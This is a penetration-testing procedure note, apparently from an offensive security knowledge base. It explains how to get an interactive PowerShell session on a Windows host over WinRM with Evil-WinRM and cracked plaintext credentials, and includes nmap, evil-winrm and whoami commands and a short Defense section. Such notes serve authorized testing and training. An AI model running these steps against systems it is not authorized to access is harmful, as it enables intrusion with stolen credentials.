---
type: procedure
description: >-
  Establish a PowerShell shell on a Windows target via WinRM using plaintext
  credentials obtained from cracking.
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[Execution]]'
  - '[[Lateral Movement]]'
techniques:
  - '[[Windows Remote Management]]'
sub_techniques: []
tags:
  - network
  - shell
  - winrm
platforms:
  - Linux
  - Windows
commands:
  - '[[commands/Evil-WinRM-Connect-with-Plaintext-Credentials]]'
tools:
  - '[[tools/Evil-WinRM]]'
validated: true
---

# Spawn-Interactive-WinRM-Shell-from-Linux

## Summary

This procedure uses Evil-WinRM to connect to a Windows host's WinRM service (port 5985) with username/password, providing an interactive PowerShell session for post-exploitation.

## Description

WinRM enables remote PowerShell execution; often enabled on domain-joined systems. With cracked AS-REP creds, attackers gain shell access for enumeration or payload execution without SMB.

## Requirements

1. Valid username/password for target
2. WinRM enabled and accessible (port 5985/HTTP or 5986/HTTPS)
3. Evil-WinRM gem installed (gem install evil-winrm)
4. Network connectivity to target

## Defense

- Disable WinRM if not needed (Disable-PSRemoting)
- Configure WinRM for HTTPS only with certs
- Use Just Enough Administration (JEA) to limit cmdlets
- Monitor WinRM auth logs (Event ID 5149/5156)

## Objectives

1. Gain remote shell access
2. Execute commands in user context
3. Prepare for AD enumeration

## Instructions

### Step 1: Verify WinRM Accessibility

**Context**: Port scan to confirm service.

**Command**:
```bash
nmap -p 5985 $_TARGET_IP
```

> Expected: 5985/tcp open http.

### Step 2: Connect with Credentials

**Context**: Basic auth over HTTP; use -i for IP.

**Command** ([[commands/Evil-WinRM-Connect-with-Plaintext-Credentials]]):
```bash
evil-winrm -i $_TARGET_IP -u $_USERNAME -p $_PASSWORD
```

> Establishes session. Expected: PS prompt.

### Step 3: Test Shell Functionality

**Context**: Run whoami to confirm context.

**Command** (in shell):
```powershell
whoami
```

> Verifies user. Expected: domain\username.

### Step 4: Exit and Reconnect if Needed

**Context**: Use exit to close; reconnect for persistence.

**Command**:
```bash
exit
```

> Success: Interactive shell operational.
